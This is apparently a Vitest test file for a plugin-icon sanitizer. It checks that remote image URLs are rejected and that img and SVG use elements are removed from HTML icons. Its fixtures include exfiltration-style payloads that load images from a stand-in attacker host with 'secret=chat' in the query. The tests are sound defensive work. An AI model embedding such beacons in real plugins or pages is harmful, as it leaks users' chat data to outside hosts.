import { describe, expect, it } from 'vitest'
import { normalizePluginIcon, sanitizePluginIconHtml } from './pluginIconSafety'

describe('plugin-defined icon network safety', () => {
  it('rejects remote image icons while allowing local raster data', () => {
    expect(() => normalizePluginIcon('https://attacker.example/icon.png?secret=chat', 'img')).toThrow(/local blob/i)
    expect(normalizePluginIcon('data:image/png;base64,aGVsbG8=', 'img')).toBe('data:image/png;base64,aGVsbG8=')
  })

  it('removes network-capable elements and attributes from HTML icons', () => {
    const sanitized = sanitizePluginIconHtml(`
      <img src="https://attacker.example/?secret=chat">
      <svg viewBox="0 0 24 24">
        <use href="https://attacker.example/icon.svg#secret"></use>
        <path d="M1 1h2v2z"></path>
      </svg>
    `)

    expect(sanitized).not.toContain('attacker.example')
    expect(sanitized).not.toMatch(/<(?:img|use)\b/i)
    expect(sanitized).toContain('<path')
  })
})
